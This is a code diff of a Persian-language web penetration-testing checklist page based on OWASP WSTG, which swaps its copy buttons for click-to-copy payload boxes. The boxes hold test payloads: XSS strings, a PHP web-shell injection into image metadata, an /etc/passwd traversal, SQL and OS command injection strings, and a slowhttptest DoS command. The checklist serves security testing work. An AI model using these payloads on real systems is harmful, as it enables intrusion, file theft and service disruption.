@@ -12,8 +12,6 @@
             --accent-color: #38bdf8;
             --border-color: #334155;
             --code-bg: #090d16;
-            --btn-bg: #0284c7;
-            --btn-hover: #0369a1;
             --success-color: #10b981;
         }
         * {
@@ -90,48 +88,32 @@
         tr:hover {
             background-color: #273548;
         }
-        code {
+        /* استایل باکس‌های قابل کپی با کلیک */
+        .click-to-copy {
             background-color: var(--code-bg);
             color: #38bdf8;
-            padding: 3px 6px;
-            border-radius: 4px;
+            padding: 8px 12px;
+            border-radius: 6px;
             font-family: monospace;
             direction: ltr;
             text-align: left;
             display: inline-block;
             font-size: 0.85rem;
-        }
-        .copy-container {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--code-bg);
-            padding: 6px;
-            border-radius: 6px;
-            direction: ltr;
-        }
-        .copy-container code {
-            background: transparent;
-            padding: 0;
-            flex-grow: 1;
+            cursor: pointer;
+            border: 1px dashed var(--border-color);
+            transition: all 0.2s ease;
+            position: relative;
             word-break: break-all;
         }
-        .copy-btn {
-            background-color: var(--btn-bg);
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.75rem;
-            transition: background 0.2s;
-            white-space: nowrap;
+        .click-to-copy:hover {
+            border-color: var(--accent-color);
+            background-color: #111c34;
         }
-        .copy-btn:hover {
-            background-color: var(--btn-hover);
-        }
-        .copy-btn.copied {
+        .click-to-copy.copied {
             background-color: var(--success-color) !important;
+            color: white !important;
+            border-style: solid;
+            border-color: var(--success-color);
         }
         .badge {
             background-color: #0369a1;
@@ -155,7 +137,7 @@
     <div class="container">
         <header>
             <h1>چک‌لیست تخصصی تست نفوذ وب</h1>
-            <p class="sub">مرجع عملیاتی پیشرفته مبتنی بر OWASP WSTG v4.2 با قابلیت کپی سریع پی‌لودها</p>
+            <p class="sub">با قابلیت کلیک/تاچ روی هر باکس کد جهت کپی خودکار (OWASP WSTG v4.2)</p>
         </header>
 
         <div class="card">
@@ -164,36 +146,27 @@
                 <table>
                     <tr>
                         <th style="width: 20%;">نوع پی‌لود</th>
-                        <th style="width: 55%;">کد / ساختار اجرایی</th>
+                        <th style="width: 55%;">کد / ساختار اجرایی (کلیک کنید تا کپی شود)</th>
                         <th style="width: 25%;">دستور العمل</th>
                     </tr>
                     <tr>
                         <td><strong>SVG XSS</strong></td>
                         <td>
-                            <div class="copy-container">
-                                <code id="p1">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;&lt;/svg&gt;</code>
-                                <button class="copy-btn" onclick="copyText('p1', this)">کپی</button>
-                            </div>
+                            <div class="click-to-copy" onclick="copySnippet(this)">&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"&gt;&lt;/svg&gt;</div>
                         </td>
                         <td>ذخیره با پسوند <code>.svg</code> و آپلود در پروفایل/گالری.</td>
                     </tr>
                     <tr>
                         <td><strong>PHP Metadata RCE</strong></td>
                         <td>
-                            <div class="copy-container">
-                                <code id="p2">exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' img.jpg</code>
-                                <button class="copy-btn" onclick="copyText('p2', this)">کپی</button>
-                            </div>
+                            <div class="click-to-copy" onclick="copySnippet(this)">exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' img.jpg</div>
                         </td>
                         <td>تزریق دستور در متادیتای عکس جهت دور زدن فیلتر نوع فایل در لینوکس.</td>
                     </tr>
                     <tr>
                         <td><strong>PDF Polyglot</strong></td>
                         <td>
-                            <div class="copy-container">
-                                <code id="p3">%PDF-1.4 1 0 obj &lt;&lt; /Pages 2 0 R /Type /Catalog &gt;&gt; endobj trailer &lt;&lt; /Root 1 0 R &gt;&gt; %&lt;script&gt;alert(1)&lt;/script&gt;</code>
-                                <button class="copy-btn" onclick="copyText('p3', this)">کپی</button>
-                            </div>
+                            <div class="click-to-copy" onclick="copySnippet(this)">%PDF-1.4 1 0 obj &lt;&lt; /Pages 2 0 R /Type /Catalog &gt;&gt; endobj trailer &lt;&lt; /Root 1 0 R &gt;&gt; %&lt;script&gt;alert(1)&lt;/script&gt;</div>
                         </td>
                         <td>ساخت فایل متنی با هدر PDF و تگ اسکریپت در انتها.</td>
                     </tr>
@@ -209,13 +182,13 @@
                         <th style="width: 15%;">شناسه OWASP</th>
                         <th style="width: 18%;">دسته‌بندی</th>
                         <th style="width: 15%;">ابزار</th>
-                        <th style="width: 52%;">سناریو و روش تست دقیق عملیاتی</th>
+                        <th style="width: 52%;">سناریو و روش تست دقیق عملیاتی (روی باکس‌های کد کلیک کنید)</th>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-INFO-01</span></td>
                         <td>موتورهای جستجو</td>
                         <td>Google</td>
-                        <td>جستجوی پیشرفته دۆرک‌ها: <div class="copy-container" style="margin-top:5px;"><code id="d1">site:target.com ext:pdf OR ext:sql OR ext:conf</code><button class="copy-btn" onclick="copyText('d1', this)">کپی</button></div></td>
+                        <td>جستجوی پیشرفته دۆرک‌ها:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">site:target.com ext:pdf OR ext:sql OR ext:conf</div></td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-INFO-02</span></td>
@@ -233,7 +206,7 @@
                         <td><span class="badge">WSTG-CONF-01</span></td>
                         <td>بررسی SSL/TLS</td>
                         <td>sslscan</td>
-                        <td>اجرای دستور: <div class="copy-container" style="margin-top:5px;"><code id="d2">sslscan target.com</code><button class="copy-btn" onclick="copyText('d2', this)">کپی</button></div> برای یافتن پروتکل‌های منسوخ مثل SSLv3 و TLS 1.0/1.1.</td>
+                        <td>اجرای دستور:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">sslscan target.com</div> جهت یافتن پروتکل‌های منسوخ مثل SSLv3 و TLS 1.0/1.1.</td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-CONF-05</span></td>
@@ -257,7 +230,7 @@
                         <td><span class="badge">WSTG-AUTHZ-01</span></td>
                         <td>پیمایش مسیر (LFI)</td>
                         <td>Burp Suite</td>
-                        <td>تغییر پارامترهای فایل به الگوی ترتیبی: <div class="copy-container" style="margin-top:5px;"><code id="d3">../../../../etc/passwd%00</code><button class="copy-btn" onclick="copyText('d3', this)">کپی</button></div> جهت خواندن فایل‌های سیستمی.</td>
+                        <td>تغییر پارامترهای فایل به الگوی ترتیبی:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">../../../../etc/passwd%00</div> جهت خواندن فایل‌های سیستمی.</td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-AUTHZ-02</span></td>
@@ -287,25 +260,25 @@
                         <td><span class="badge">WSTG-INPV-01</span></td>
                         <td>XSS انعکاسی</td>
                         <td>Browser</td>
-                        <td>وارد کردن پی‌لود استاندارد تست در فیلدهای جستجو یا پارامترهای URL: <div class="copy-container" style="margin-top:5px;"><code id="d4">&lt;script&gt;alert(document.domain)&lt;/script&gt;</code><button class="copy-btn" onclick="copyText('d4', this)">کپی</button></div></td>
+                        <td>وارد کردن پی‌لود استاندارد تست در فیلدهای جستجو یا پارامترهای URL:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">&lt;script&gt;alert(document.domain)&lt;/script&gt;</div></td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-INPV-02</span></td>
                         <td>XSS ذخیره‌شده</td>
                         <td>Browser</td>
-                        <td>ثبت پی‌لود مخرب در فرم نظرات یا بخش پروفایل: <div class="copy-container" style="margin-top:5px;"><code id="d5">&lt;img src=x onerror=alert(1)&gt;</code><button class="copy-btn" onclick="copyText('d5', this)">کپی</button></div> و رفرش صفحه توسط یک کاربر دیگر.</td>
+                        <td>ثبت پی‌لود مخرب در فرم نظرات یا بخش پروفایل:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">&lt;img src=x onerror=alert(1)&gt;</div> و رفرش صفحه توسط یک کاربر دیگر.</td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-INPV-05</span></td>
                         <td>تزریق SQL (SQLi)</td>
                         <td>Burp Suite</td>
-                        <td>افزودن کاراکترهای کنترلی به پارامترها: <div class="copy-container" style="margin-top:5px;"><code id="d6">id=5' OR '1'='1</code><button class="copy-btn" onclick="copyText('d6', this)">کپی</button></div> یا بررسی تاخیر زمانی با تابع پایگاه داده.</td>
+                        <td>افزودن کاراکترهای کنترلی به پارامترها:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">id=5' OR '1'='1</div> یا بررسی تاخیر زمانی با تابع پایگاه داده.</td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-INPV-11</span></td>
                         <td>تزریق دستور (OS)</td>
                         <td>Burp Suite</td>
-                        <td>افزودن کامندهای اجرایی به انتهای پارامترهای ورودی: <div class="copy-container" style="margin-top:5px;"><code id="d7">; sleep 10 --</code><button class="copy-btn" onclick="copyText('d7', this)">کپی</button></div> و سنجش تأخیر پاسخ سرور.</td>
+                        <td>افزودن کامندهای اجرایی به انتهای پارامترهای ورودی:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">; sleep 10 --</div> و سنجش تأخیر پاسخ سرور.</td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-ERRH-01</span></td>
@@ -317,13 +290,13 @@
                         <td><span class="badge">WSTG-BUSL-01</span></td>
                         <td>منطق تجاری / سبد خرید</td>
                         <td>Burp Suite</td>
-                        <td>دستکاری مقادیر عددی حساس؛ مثلاً تغییر تعداد کالا در سبد خرید به عدد منفی: <div class="copy-container" style="margin-top:5px;"><code id="d8">quantity=-1</code><button class="copy-btn" onclick="copyText('d8', this)">کپی</button></div> و بررسی منطق محاسبه قیمت نهایی.</td>
+                        <td>دستکاری مقادیر عددی حساس؛ مثلاً تغییر تعداد کالا در سبد خرید به عدد منفی:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">quantity=-1</div> و بررسی منطق محاسبه قیمت نهایی.</td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-BUSL-09</span></td>
                         <td>حمله DoS لایه ۷</td>
                         <td>slowhttptest</td>
-                        <td>اجرای تست پایداری سرور با دستور: <div class="copy-container" style="margin-top:5px;"><code id="d9">slowhttptest -c 500 -H -i 10 -r 100 -t GET -u https://target.com</code><button class="copy-btn" onclick="copyText('d9', this)">کپی</button></div></td>
+                        <td>اجرای تست پایداری سرور با دستور:<br><div class="click-to-copy" style="margin-top:6px;" onclick="copySnippet(this)">slowhttptest -c 500 -H -i 10 -r 100 -t GET -u https://target.com</div></td>
                     </tr>
                     <tr>
                         <td><span class="badge">WSTG-CLNT-11</span></td>
@@ -341,16 +314,16 @@
     </div>
 
     <script>
-        function copyText(elementId, btn) {
-            const text = document.getElementById(elementId).innerText;
+        function copySnippet(element) {
+            const text = element.innerText;
             navigator.clipboard.writeText(text).then(() => {
-                const originalText = btn.innerText;
-                btn.innerText = 'کپی شد! ✓';
-                btn.classList.add('copied');
+                const originalHTML = element.innerHTML;
+                element.innerHTML = 'کپی شد! ✓';
+                element.classList.add('copied');
                 setTimeout(() => {
-                    btn.innerText = originalText;
-                    btn.classList.remove('copied');
-                }, 2000);
+                    element.innerHTML = originalHTML;
+                    element.classList.remove('copied');
+                }, 1500);
             }).catch(err => {
                 alert('خطا در کپی کردن متن!');
             });
